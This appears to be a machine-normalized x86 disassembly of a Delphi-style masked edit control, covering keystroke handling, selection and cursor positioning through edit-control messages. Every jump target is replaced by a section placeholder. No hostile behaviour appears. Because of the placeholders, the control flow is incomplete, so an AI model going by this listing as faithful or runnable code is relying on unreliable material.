je r-xdata
mov dx [ esi ]
mov cl [ esp ]
mov eax ebx
call sub_461144
mov [ esi ] 0x0
jmp r-xdata
cmp [ esi ] 0x23
jne r-xdata
cmp [ esi ] 0x2e
jne r-xdata
cmp [ esi ] 0x8
jne r-xdata
test [ esp ] 0x1
je r-xdata
mov eax ebx
call sub_460c60
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe8 ]
test al al
je r-xdata
mov [ esi ] 0x0
jmp r-xdata
mov dx [ esi ]
mov eax ebx
call sub_461214
sub_460328
push ebx
push esi
push ecx
mov [ esp ] cl
mov esi edx
mov ebx eax
cmp [ ebx + 0x23c ] 0x0
jne r-xdata
mov eax ebx
call sub_4607d0
test al al
je r-xdata
mov edx esi
mov cl [ esp ]
mov eax ebx
call sub_44387c
pop edx
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
cmp [ esi ] 0x25
je r-xdata
test [ esp ] 0x4
je r-xdata
cmp [ esi ] 0x27
jne r-xdata
mov eax ebx
call sub_460c60
sub_460378
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_44394c
mov eax esi
call sub_4607d0
test al al
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx ] 0x0
je r-xdata
mov al [ ebx ]
sub al 0x3
je r-xdata
sub al 0x13
je r-xdata
sub al 0x2
je r-xdata
mov edx ebx
mov eax esi
call sub_460cd4
mov [ ebx ] 0x0
sub_4603d0
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43fb18
mov eax ebx
call sub_4607d0
test al al
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax ebx
call sub_4609a8
mov eax [ esp ]
mov [ ebx + 0x230 ] eax
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov eax ebx
call sub_460c60
movsx eax [ esi + 0x8 ]
cmp eax [ ebx + 0x234 ]
jle r-xdata
mov eax [ esp + 0x4 ]
mov [ ebx + 0x230 ] eax
sub_460450
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4604ac
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4604b8
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_4043ec
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4604b3
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
mov eax esi
call sub_4044a0
mov edx eax
mov eax ebx
call sub_43e128
mov eax ebx
call sub_460c60
sub_4604cc
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_46050c
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_46051c
mov eax [ ebp - 0x4 ]
call sub_4042a0
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460513
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
sub_46051c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4605a0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4607d0
test al al
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4604b8
mov edx [ ebp - 0x4 ]
mov ecx esi
mov eax ebx
call sub_4615e0
cmp [ ebx + 0x22c ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_43e14c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4605a7
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404004
retn
lea eax [ ebp - 0x8 ]
push eax
mov edx [ esi ]
xor ecx ecx
mov eax ebx
call sub_461598
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_404034
sub_4605b0
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4606a6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4607d0
test al al
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_404078
cmp [ ebx + 0x22c ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_43e17c
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov cl 0x1
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_461598
mov edx [ ebp - 0x10 ]
lea eax [ ebp - 0x4 ]
call sub_404078
lea eax [ ebp - 0xc ]
push eax
mov cl [ ebx + 0x224 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x220 ]
call sub_45fda4
mov edx [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
call sub_404078
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4606ad
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_404004
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_460450
test [ ebx + 0x1c ] 0x10
je r-xdata
test [ ebx + 0x22d ] 0x4
jne r-xdata
test [ ebx + 0x1c ] 0x1
jne r-xdata
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0xf0 ]
test al al
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b54c
call sub_403a1c
sub_4606b4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4607d0
test al al
jne r-xdata
mov eax ebx
call sub_434cb4
mov dx 0x2e
mov eax ebx
call sub_461214
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_4606e8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4607c2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4607d0
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
cmp [ ebx + 0x20e ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4607c9
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404004
retn
call sub_42c270
mov edx [ eax ]
call [ edx + 0x18 ]
call sub_42c270
lea edx [ ebp - 0x4 ]
call sub_42beb8
call sub_42c270
mov edx [ eax ]
call [ edx + 0x14 ]
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_4609a8
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_4604b8
mov eax [ ebp - 0x10 ]
sub eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
mov eax ebx
call sub_461ccc
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_460450
mov eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_461d64
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_460450
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_4609f0
sub_4607e0
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_460895
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_4604b8
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_4615e0
lea eax [ ebx + 0x220 ]
mov edx esi
call sub_404034
mov eax esi
call sub_4042a0
mov edx eax
mov eax [ ebx + 0x220 ]
call sub_45fb34
mov [ ebx + 0x228 ] eax
mov eax esi
call sub_45f9b8
mov [ ebx + 0x22c ] al
mov eax esi
call sub_45fa3c
mov [ ebx + 0x224 ] al
lea eax [ ebp - 0xc ]
push eax
mov cl 0x1
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_461598
mov edx [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
call sub_404078
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_460450
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46089c
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_404004
retn
sub_4608a4
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x220 ]
call sub_4043ec
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_444c6c
test al al
je r-xdata
test esi esi
je r-xdata
mov edx esi
mov eax ebx
call sub_4607e0
and [ ebx + 0x22d ] 0xfe
cmp [ ebx + 0x220 ] 0x0
je r-xdata
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax ebx
call sub_4609a8
test [ ebx + 0x1c ] 0x1
jne r-xdata
xor edx edx
mov eax ebx
call sub_434b20
mov eax ebx
call sub_4607d0
test al al
je r-xdata
or [ ebx + 0x22d ] 0x1
xor edx edx
mov eax ebx
call sub_460450
mov eax ebx
call sub_444c6c
test al al
je r-xdata
cmp [ ebx + 0x228 ] 0x0
jle r-xdata
mov eax ebx
call sub_444968
mov esi eax
call GetFocus
cmp esi eax
jne r-xdata
mov edx [ ebx + 0x228 ]
mov eax ebx
call sub_434b20
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx [ esp ]
mov eax ebx
call sub_4609f0
sub_460978
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4607d0
test al al
jne r-xdata
mov edx [ ebx + 0x228 ]
mov eax ebx
call sub_434b20
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_434b20
pop esi
pop ebx
retn
sub_4609a8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0xb0
mov eax ebx
call sub_444968
push eax
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_4609cc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0xb1
mov eax ebx
call sub_444968
push eax
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_4609f0
push ebp
mov ebp esp
add esp 0xfffffde4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x21c ] ecx
mov [ ebp - 0x218 ] ecx
mov [ ebp - 0x214 ] ecx
mov [ ebp - 0x210 ] ecx
mov [ ebp - 0x20c ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_460c50
push [ fs : eax ]
mov [ fs : eax ] esp
cmp ebx 0x1
jl r-xdata
mov [ ebp - 0x8 ] ebx
mov eax [ ebp - 0x4 ]
call sub_4607d0
test al al
je r-xdata
lea edx [ ebp - 0x20c ]
mov eax [ ebp - 0x4 ]
call sub_4604b8
mov eax [ ebp - 0x20c ]
mov edx ebx
call sub_40be44
cmp al 0x1
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jge r-xdata
cmp [ ebp - 0x8 ] 0x0
jge r-xdata
dec ebx
lea edx [ ebp - 0x218 ]
mov eax [ ebp - 0x4 ]
call sub_4604b8
mov eax [ ebp - 0x218 ]
call sub_4042a0
cmp eax [ ebp - 0x8 ]
jg r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov ebx [ ebp - 0x8 ]
inc ebx
lea edx [ ebp - 0x210 ]
mov eax [ ebp - 0x4 ]
call sub_4604b8
mov eax [ ebp - 0x210 ]
call sub_4042a0
cmp ebx eax
jge r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4609cc
lea edx [ ebp - 0x21c ]
mov eax [ ebp - 0x4 ]
call sub_4604b8
mov eax [ ebp - 0x21c ]
call sub_4042a0
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x228 ]
cmp eax [ ebp - 0x8 ]
jg r-xdata
lea edx [ ebp - 0x214 ]
mov eax [ ebp - 0x4 ]
call sub_4604b8
mov eax [ ebp - 0x214 ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
mov ecx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4609cc
cmp ebx [ ebp - 0x8 ]
je r-xdata
mov [ ebp - 0x8 ] eax
mov ebx [ ebp - 0x8 ]
inc ebx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x230 ] edx
jmp r-xdata
lea eax [ ebp - 0x108 ]
push eax
call GetKeyboardState
mov edx 0x100
lea eax [ ebp - 0x208 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460c57
lea eax [ ebp - 0x21c ]
mov edx 0x5
call sub_404004
retn
mov [ eax ] 0x0
inc eax
dec edx
jne r-xdata
mov [ ebp - 0x1f8 ] 0x81
mov eax [ ebp - 0x4 ]
mov si 0xffc8
call sub_40348c
and eax 0x7f
movzx eax [ eax * 2 + rw-data ]
mov [ ebp + eax - 0x208 ] 0x81
lea eax [ ebp - 0x208 ]
push eax
call SetKeyboardState
mov eax [ ebp - 0x4 ]
mov [ eax + 0x23c ] 0x1
xor eax eax
push ebp
push sub_460bbe
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
mov eax [ ebp - 0x4 ]
mov si 0xffc8
call sub_40348c
and eax 0x7f
movzx eax [ eax * 2 + rw-data ]
push eax
push 0x100
mov eax [ ebp - 0x4 ]
call sub_444968
push eax
call SendMessageA
push 0x1
mov eax [ ebp - 0x4 ]
mov si 0xffc8
call sub_40348c
and eax 0x7f
movzx eax [ eax * 2 + rw-data ]
push eax
push 0x101
mov eax [ ebp - 0x4 ]
call sub_444968
push eax
call SendMessageA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x23c ] 0x0
retn
sub_460c60
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_444c6c
test al al
je r-xdata
pop ecx
pop edx
pop ebx
retn
mov eax ebx
call sub_4607d0
test al al
je r-xdata
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax ebx
call sub_4609a8
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
jne r-xdata
mov edx [ esp ]
mov eax ebx
call sub_4609f0
sub_460cac
push ebx
mov ebx eax
mov eax ebx
call sub_434b50
test al al
je r-xdata
pop ebx
retn
mov edx [ ebx + 0x238 ]
mov eax ebx
call sub_460450
xor edx edx
mov eax ebx
call sub_434b88
sub_460cd4
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_460e99
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x0
xor eax eax
mov al [ ebx ]
cmp ax 0x1b
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xe8 ]
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xec ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460ea0
lea eax [ ebp - 0x10 ]
call sub_403fe0
retn
cmp [ esi + 0x20e ] 0x0
jne r-xdata
xor eax eax
mov al [ ebx ]
cmp ax 0x8
je r-xdata
cmp ax 0xd
jne r-xdata
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_4609a8
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x8 ]
dec eax
jle r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xf8 ]
jmp r-xdata
mov al [ ebx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
mov dx 0x2e
mov eax esi
call sub_461214
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4610e8
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4609f0
mov edx ebx
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_4617b4
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
push 0x1
push 0x102
push 0x102
mov eax esi
call sub_444968
push eax
lea eax [ ebp - 0x2c ]
push eax
call PeekMessageA
test eax eax
je r-xdata
mov al [ ebx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
cmp [ ebp - 0x28 ] 0x12
jne r-xdata
lea eax [ ebp - 0x10 ]
mov dl [ ebx ]
call sub_4041c8
lea eax [ ebp - 0x30 ]
mov dl [ ebx ]
mov [ eax + 0x1 ] dl
mov [ eax ] 0x1
lea edx [ ebp - 0x30 ]
lea eax [ ebp - 0x34 ]
call sub_402b90
lea eax [ ebp - 0x38 ]
mov dl [ ebp - 0x24 ]
mov [ eax + 0x1 ] dl
mov [ eax ] 0x1
lea edx [ ebp - 0x38 ]
lea eax [ ebp - 0x34 ]
mov cl 0x2
call sub_402b60
lea edx [ ebp - 0x34 ]
lea eax [ ebp - 0x10 ]
call sub_404244
mov ecx [ ebp - 0x8 ]
add ecx 0x2
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4609cc
jmp r-xdata
mov eax [ ebp - 0x24 ]
push eax
call PostQuitMessage
mov eax [ ebp - 0x10 ]
call sub_4044a0
push eax
push 0x0
push 0xc2
mov eax esi
call sub_444968
push eax
call SendMessageA
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_4609a8
xor ecx ecx
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_461094
sub_460eac
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_461086
push [ fs : eax ]
mov [ fs : eax ] esp
test [ ebp - 0x1 ] 0x4
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46108d
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_404004
retn
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_4609a8
test [ ebp - 0x1 ] 0x1
je r-xdata
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x8 ]
dec eax
jle r-xdata
cmp si 0x27
jne r-xdata
cmp si 0x25
jne r-xdata
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x8 ]
cmp eax 0x2
jne r-xdata
dec [ ebx + 0x230 ]
mov eax [ ebp - 0x8 ]
add eax 0x2
cmp eax [ ebp - 0xc ]
jne r-xdata
inc [ ebx + 0x230 ]
mov eax [ ebp - 0x8 ]
inc eax
cmp eax [ ebp - 0xc ]
jne r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_4610cc
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebx + 0x230 ]
jne r-xdata
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_4604b8
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov al [ eax + edx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
cmp [ ebx + 0x230 ] 0x0
jge r-xdata
mov eax [ ebx + 0x230 ]
cmp eax [ ebp - 0x8 ]
jle r-xdata
mov eax [ ebx + 0x228 ]
cmp eax [ ebx + 0x230 ]
jge r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_4609cc
inc [ ebx + 0x230 ]
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_4604b8
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov al [ eax + edx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_4609f0
jmp r-xdata
mov edx [ ebx + 0x230 ]
mov eax ebx
call sub_4609f0
jmp r-xdata
dec [ ebx + 0x230 ]
cmp si 0x25
jne r-xdata
xor eax eax
mov [ ebx + 0x230 ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
inc eax
mov ecx eax
mov edx eax
mov eax ebx
call sub_4609cc
dec [ ebx + 0x230 ]
mov [ ebx + 0x230 ] eax
jmp r-xdata
mov ecx 0x1
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_461094
mov ecx 0x2
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_461094
jmp r-xdata
mov ecx 0x2
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_461094
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_4610cc
jmp r-xdata
sub_461094
push ebx
push esi
push edi
mov edi edx
mov esi eax
lea ebx [ ecx + edi ]
mov edx ebx
mov eax esi
call sub_4610e8
mov ebx eax
mov edx ebx
mov eax [ esi + 0x220 ]
call sub_45fbe4
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_4609f0
pop edi
pop esi
pop ebx
retn
mov ebx edi
sub_4610e8
push ebx
push esi
mov esi eax
mov ebx edx
jmp r-xdata
cmp ebx [ esi + 0x228 ]
jge r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x220 ]
call sub_45fbe4
test al al
jne r-xdata
inc ebx
sub_461110
push ebx
push esi
mov esi eax
mov ebx edx
jmp r-xdata
test ebx ebx
jl r-xdata
test ebx ebx
jge r-xdata
mov edx ebx
mov eax [ esi + 0x220 ]
call sub_45fbe4
test al al
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_4610e8
mov ebx eax
dec ebx
sub_461144
push ebx
push esi
add esp 0xfffffff4
mov [ esp ] cl
mov esi edx
mov ebx eax
lea ecx [ esp + 0x8 ]
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_4609a8
cmp si 0x24
jne r-xdata
test [ esp ] 0x1
je r-xdata
test [ esp ] 0x1
je r-xdata
mov edx [ ebx + 0x228 ]
mov eax ebx
call sub_4609f0
mov eax [ esp + 0x8 ]
cmp eax [ ebx + 0x230 ]
je r-xdata
xor edx edx
mov eax ebx
call sub_4609f0
mov eax [ esp + 0x4 ]
cmp eax [ ebx + 0x230 ]
je r-xdata
mov ecx [ ebx + 0x228 ]
mov edx [ esp + 0x4 ]
mov eax ebx
call sub_4609cc
mov eax ebx
call sub_460c60
jmp r-xdata
mov eax [ esp + 0x4 ]
inc eax
cmp eax [ esp + 0x8 ]
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov ecx [ esp + 0x8 ]
xor edx edx
mov eax ebx
call sub_4609cc
mov eax ebx
call sub_460c60
jmp r-xdata
mov eax [ esp + 0x4 ]
inc eax
cmp eax [ esp + 0x8 ]
je r-xdata
mov eax [ ebx + 0x228 ]
mov [ ebx + 0x230 ] eax
mov eax [ esp + 0x8 ]
dec eax
mov [ esp + 0x4 ] eax
xor eax eax
mov [ ebx + 0x230 ] eax
jmp r-xdata
mov eax [ esp + 0x4 ]
inc eax
mov [ esp + 0x8 ] eax
sub_461214
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
lea edi [ ebp - 0x4 ]
xor eax eax
push ebp
push sub_461320
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x20e ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461327
lea eax [ ebp - 0xc ]
call sub_403fe0
retn
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax ebx
call sub_4609a8
mov eax [ ebp - 0x8 ]
sub eax [ edi ]
dec eax
jg r-xdata
mov eax [ ebp - 0x8 ]
sub eax [ edi ]
dec eax
jl r-xdata
cmp si 0x8
jne r-xdata
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_4604b8
mov eax [ ebp - 0x8 ]
sub eax [ edi ]
push eax
lea edx [ ebp - 0xc ]
mov ecx [ edi ]
mov eax ebx
call sub_461ccc
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp - 0x8 ]
sub ecx [ edi ]
mov edx [ edi ]
inc edx
mov eax [ ebp - 0xc ]
call sub_404500
mov eax [ ebp - 0xc ]
call sub_4044a0
push eax
push 0x0
push 0xc2
mov eax ebx
call sub_444968
push eax
call SendMessageA
mov eax [ ebp - 0x8 ]
sub eax [ edi ]
dec eax
je r-xdata
mov esi [ edi ]
mov edx [ edi ]
mov eax ebx
call sub_4610cc
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax ebx
call sub_4609a8
cmp esi [ edi ]
je r-xdata
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax ebx
call sub_4609a8
mov edx [ edi ]
dec edx
mov eax ebx
call sub_4609f0
mov edx [ edi ]
mov eax ebx
call sub_4610e8
mov [ edi ] eax
mov edx [ edi ]
mov eax ebx
call sub_4609f0
jmp r-xdata
sub_461330
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4613b3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4607d0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_43520c
test [ ebx + 0x1c ] 0x10
jne r-xdata
test [ ebx + 0x22d ] 0x2
jne r-xdata
and [ ebx + 0x22d ] 0xfd
mov eax ebx
call sub_460c60
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4604b8
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x238 ]
call sub_404034
mov edx esi
mov eax ebx
call sub_43520c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4613ba
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
sub_4613c0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_461441
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_435248
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_4604b8
mov edx [ ebp - 0xc ]
lea eax [ ebx + 0x238 ]
call sub_404034
mov eax ebx
call sub_444c6c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461448
lea eax [ ebp - 0xc ]
call sub_403fe0
retn
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4609a8
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4610e8
cmp eax [ ebp - 0x4 ]
je r-xdata
mov edx eax
mov eax ebx
call sub_4609f0
sub_461450
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x4 ] 0x1b
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_4607d0
test al al
je r-xdata
mov eax ebx
call sub_434b50
test al al
je r-xdata
mov [ esi + 0xc ] 0x1
sub_461488
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4607d0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_443d90
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xf8 ]
mov eax ebx
call sub_460c60
sub_4614bc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor edx edx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_46154e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_4604b8
mov eax esi
call sub_4607d0
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461555
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
mov eax esi
call sub_434b50
test al al
je r-xdata
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xf0 ]
test al al
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4609f0
mov eax esi
mov edx [ eax ]
call [ edx + 0xf4 ]
or [ esi + 0x22d ] 0x2
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_46155c
push ebx
add esp 0xfffffff8
mov ebx eax
push 0x0
call MessageBeep
mov eax [ ebx + 0x220 ]
mov [ esp ] eax
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b588
call sub_403a1c
pop ecx
pop edx
pop ebx
retn
sub_461598
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
